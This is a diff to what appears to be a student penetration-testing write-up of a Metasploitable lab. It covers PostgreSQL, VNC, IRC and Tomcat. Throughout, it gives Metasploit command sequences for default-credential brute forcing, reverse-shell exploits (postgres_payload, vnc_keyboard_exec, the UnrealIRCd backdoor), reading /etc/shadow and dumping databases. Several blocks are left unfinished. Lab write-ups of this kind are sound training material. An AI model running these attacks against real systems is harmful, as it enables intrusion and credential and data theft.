@@ -789,7 +789,7 @@ ftp >
 ## Exploiting Service on Port 3306 mysql -> Mysql 5.0.51a
 MySQL is an open-source relational database management system (RDBMS) commonly used for storing, managing, and retrieving data for web applications and services. MySQL uses SQL (Structured Query Language) for querying and managing databases. It’s widely used due to its speed, reliability, and compatibility with various platforms. It was normally used for website for storing data in small enterprises. As this service stores the sensitive data of the different clients so its securing is very concern.
 ### Identifying Vulnerabilites or Weakness
-**1. Login allowed without Password** On target system this service is misconfigured to allowed login with just username and without password. We can simply use mysql client to connect to this misconfigured database server when we get a username.
+**1. Login allowed without Password** On target system this service is misconfigured to allowed login with just username and without password. We can simply use **mysql client** to connect to this misconfigured database server when we get a username.
 **2. Bruteforcing Attack** As this service requires authentication to connect the mysql server running on the target, we can perform bruteforcing attack to guess the username and password using tool like hydra or metasploit and gained access to the databases and tables.
 ### Exploitation
 As we had metasploit module which tries to connect with different default usernames, to check if there is 'login allowed without password' may we get something
@@ -870,3 +870,202 @@ select * from accounts;
 Here in the accounts table there are different user and their plain password for the owasp10 webapp. 
 
 **Till now we get two tables which have sensitive information about its users on the webapp of dvwa and owasp10.** We can also performing dumping crudential and other stuff on the different databases.
+
+---
+## Exploiting Service on Port 5432 Postgresql -> postgresql db 8.3.0-8.3.7
+Postgresql is a powerful, open source object-relation database system that uses and extends the SQL language combined with many features that safety store and scale the most complicated data workload.
+It mainly used for large enterprise where we handle complex queries, large no of datatypes and reliable concurrency support for multiple user simultaneously. It is more efficient for large databases and complex queries.
+### Identifying Vulnerabilites or Weakness
+As we start exploring the service, using default crudentials
+**1. Brute force attack using Default crudential** As this service is configured to use the default crudential that comes preconfigured with the postgres service during installation. So we can perform the brute force attack using metasploit or hydra to get the login crudential.
+**2. Linux payload Execution Vulnerability** On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. We had a metasploit module that compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object's constructor, it does not need to conform to specific Postgres API versions,
+And lets us access a remote shell.
+### Exploitation
+##### Bruteforce attack using Default crudential 
+**Using metasploit**
+```
+msfconsole -q
+msf > search postgres_login
+msf > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(scanner/postgres/postgres_login) > show options
+msf auxiliary(scanner/postgres/postgres_login) > set Anonymous_login true
+msf auxiliary(scanner/postgres/postgres_login) > set Blank_passwords true
+msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1.103
+msf auxiliary(scanner/postgres/postgres_login) > set User_file /usr/share/metasploit-framework/data/wordlist/postgres_defaut_user.txt
+msf auxiliary(scanner/postgres/postgres_login) > set Pass_file /usr/share/metasploit-framework/data/wordlist/postgres_defaut_pass.txt
+msf auxiliary(scanner/postgres/postgres_login) > run
+```
+[]
+Here, we got that the postgres service is set to use the default **username=postgres** and **password=postgres**.
+
+Now we can connect to that postgres service using postgresql-client ->**psql**
+```
+psql -U postgres -h 192.168.1.103 -d template1
+```
+Since this postgres server running on my metasploitable machine is very old and it doesn't support the newer postgres command like \du -> listing the users, \l -> listing all databases and so on because the psql client is sending these commands which includes columns (like rolreplication and datcollate) that only exist in later PostgreSQL versions.
+So, Listing the database using old sql command
+```
+psql -U postgres -h 192.168.1.103 -c 'Select datname from pg_databases;'
+#listing tables from a particular database
+psql -U postgres -h 192.168.1.103 -d postgres -c 'Select table_name from information_schema.tables where table_schema= 'public';'
+```
+**OR we can use a metasploit module to execute the sql command over the postgres server**
+```
+msfconsole -q
+msf > search admin/postgres
+msf > use auxiliary/scanner/admin/postgres
+msf auxiliary(scanner/admin/postgres) > Show options
+msf auxiliary(scanner/admin/postgres) > set RHOST 192.168.1.103
+msf auxiliary(scanner/admin/postgres) > set Username postgres
+msf auxiliary(scanner/admin/postgres) > set password postgres
+msf auxiliary(scanner/admin/postgres) > set Sql 'Select datname from pg_databases;'
+msf auxiliary(scanner/admin/postgres) > run
+```
+
+##### linux payload Execution Vulerability
+```
+msfconsole -q
+msf > search postgres_payload
+msf > use exploit/linux/postgres/postgres_payloads
+msf > exploit(linux/postgres/postgres_payload) > show options
+msf > exploit(linux/postgres/postgres_payload) >set RHOSTS 192.168.1.103
+msf > exploit(linux/postgres/postgres_payload) > set LHOST 192.168.1.101
+msf > exploit(linux/postgres/postgres_payload) > run
+```
+Here the payload get uploaded and gets executed by the target and we got a meterpreter session...
+
+### Post-Exploitation things
+Here we got successfully connected to psql server of the target and also get a remote shell using the linux payload to the target. Now we can perform dumping the contents of the databases present on the postgres server, i.e we can copy the entire data as well as the schema of the databases and tables present on the postgres server.
+**For that we can use pg_dump**
+```
+pg_dump -h 192.168.1.103 -U postgres --password -d postgres --table=* -f db_dump.txt
+```
+**But as we got above that there is not a single relation/table present on this targeted postgres server, So we can't get anything**
+
+**Stealing sensitive file and data**
+As we have the crudential of postgres, we can use readfile module to read the content of sensitive file like **etc/passwd** and **etc/shadow**.
+```
+msfconsole -q
+msf > search postgres_readfile
+msf > use
+
+```
+Here we got the content of /etc/passwd and using with /etc/shadow we can get the password hashes, and using tool like 'john the ripper' we can get root user crudential and used to esculate privilages to root.
+
+---
+## Exploiting Service on Port 5900 VNC -> vnc protocol 3.3
+VNC(Virtual network computing ) is remote access protocol to control a machine remotely using tcp/ip. It is a graphical desktop-sharing system that use the remotely machine and control it with your local keyboard and mouse.
+
+It mainly works on client-server archeitecture, i.e both client and server to need to have vnc service installed. It was mainly designed and worked for linux environment. While windows mainly uses RDP(remote desktop protocol) to remote desktop access. There are various software client for the vnc protocol like ultraVNC, RealVNC, TightVNC etc.
+### Identifying Vulnerabilites or Weakness
+**1. Weak Authentication Mechanism** VNC 3.3 uses a weak challenge-response authentication, making it vulnerable to **brute-force attacks**. Given the lack of security hardening in early VNC versions, an attacker can potentially capture VNC traffic and brute-force credentials.
+
+**2. No Encryption** VNC 3.3 does not support encryption natively. This means that data, including keystrokes and authentication data, is transmitted in plaintext. Attackers with network access can use tools like Wireshark to capture and analyze this traffic.
+### Exploitation
+##### Bruteforce attack for default or weak crudential
+We can peroform the bruteforce attack using tools like metasploit and hydra, and check if it uses the default or weak crudential.
+```
+msfconsole -q
+msf > search vnc_login
+msf > use /auxiliary/scanner/vnc/vnc_login
+msf auxiliary(scanner/vnc/vnc_login) > show options
+msf auxiliary(scanner/vnc/vnc_login) > set RHOSTS 192.168.1.103
+msf auxiliary(scanner/vnc/vnc_login) > set Anonymous_login true
+msf auxiliary(scanner/vnc/vnc_login) > set Blank_passwords true
+msf auxiliary(scanner/vnc/vnc_login) > set Username true
+msf auxiliary(scanner/vnc/vnc_login) > set Stop_on_success true
+msf auxiliary(scanner/vnc/vnc_login) > run
+```
+Here we got that vnc is configure to used the default crudential which is **username=root** and **passowrd=password**.
+Now lets connect to the vnc service using a vnc-client, I had tightVNC client
+```
+vncviewer 192.168.1.103
+password
+```
+Here we got the target's remote desktop access as a **root** user. Now we can perform post-exploitation things like reading sensitive file and data etc...
+
+**If we want to get only the remote-cli access, if we don't have a vnc-client**
+For that we can use a module called vnc_keyboard_exec
+```
+msfconsole -q
+msf > search vnc_keyboard_exec
+msf > use exploit/multi/vnc/vnc_keyboard_exec
+msf exploit(multi/vnc/vnc_keyboard_exec) > show options
+msf exploit(multi/vnc/vnc_keyboard_exec) > set RHOST 192.168.1.103
+msf exploit(multi/vnc/vnc_keyboard_exec) > set SRVHost 192.168.1.101
+msf exploit(multi/vnc/vnc_keyboard_exec) > show targets
+msf exploit(multi/vnc/vnc_keyboard_exec) > set target 2
+msf exploit(multi/vnc/vnc_keyboard_exec) > show payloads
+msf exploit(multi/vnc/vnc_keyboard_exec) > set payload cmd/unix/reverse_perl
+msf exploit(multi/vnc/vnc_keyboard_exec) > run
+```
+Here also we got a root shell, to our target....
+
+---
+### Port 6000 x11 -> x windows
+The X window System is a windowing for bitmap display, which is common on the unix based OS. It provide the basic framework for GUI based environment. But here we have our target metasploitable don't have any GUI environment, and hence we can perform any attack on this service.
+
+---
+## Exploiting Service on Port 6667 irc -> unreal IRCD
+IRC (Internet Relay Chat) is a protocol used for real-time text messaging between multiple users across different network. Any user can connect to server using irc-client and send request to join a room and start the conversation.
+### Identifying Vulnerabilites or Weakness
+**1. Unrestricted Access** Many IRC services lack robust authentication, allowing any unauthenticated users to connect. This can enable an attacker to join, monitor, or manipulate channels.
+**2. Weak or No Password Protection for Channels**
+IRC channels can be configured with passwords, but on Metasploitable, many channels are set up without them. Any Attacker can join channels and interact with any users or bots present and can see the sensitive conversation or data.
+**Backdoor command execution** In the ircd 3.2.8.1 there is a backdoor present in the service which can get the remote shell to the attacker.
+### Exploitation
+##### Unrestricted Access and no channel protection exploitation
+As the ircd service on the target are misconfigured to gave access to all hosts on the same network. when an attacker enters into the network, it can access the ircd services using any irc-client like **irssi** and **Hexchat**
+
+**Connecting using the irssi**
+```
+irssi 192.168.1.103 -p 6667
+```
+Once get connected to the service, you can join rooms
+```
+\join room
+#see the conversation going on
+\quit
+```
+##### Exploitation using ircd3281_backdoor
+```
+msfconsole -q
+msf > search ircd3281_backdoor
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.1.103
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 10
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.1.101
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+```
+Here we got a **root** shell to the target system by connecting to the backdoor present in the ircd service. Now we can perform anything on the target as we have the root shell to the target like stealing sensitive data and file etc...
+
+---
+## Exploiting Service running on port 8180 http -> Apache tomcat/coyote JSP engine 1.1
+Here we have an another web-server running on the target port 8180 which is apache tomcat server, a pure java based server used to execute the java-application on the server. Apache Tomcat is an open-source application server designed to run Java applications, primarily Java Servlets and JSPs. Coyote is the HTTP connector component within Tomcat that allows it to serve HTTP requests and JSP pages. The Coyote JSP engine processes JSP files on the server, dynamically generating HTML content to be sent to users' browsers.
+
+Tomcat with Coyote is commonly used for:
+1. Web-Application Hosting.
+2. Testing Java-based applicaion.
+### Identifying Vulnerabilites or Weaknes
+**1. Default or Weak Credentials** As the target tomcat server is configured with default crudential, then we can perform the **bruteforce attack** to find the crudential for the running server.
+**2. Manager Application Access**  If accessible, the /manager application allows deploying or undeploying WAR files, potentially giving attackers control over the server if we get the crudential.
+
+### Exploitation 
+##### Bruteforce attack using mgr_login module
+```
+msfconsole -q
+msf > search mgr_login
+msf > use
+msf > show options
+```
+Here we get that the server is set to used the default crudential as **username= tomcat** and **passowrd=tomcat**.
+##### Manager Application Access using crudential
+```
+msfconsole -q
+msf > search mgr_deploy
+msf > use
+msf >
+
+```
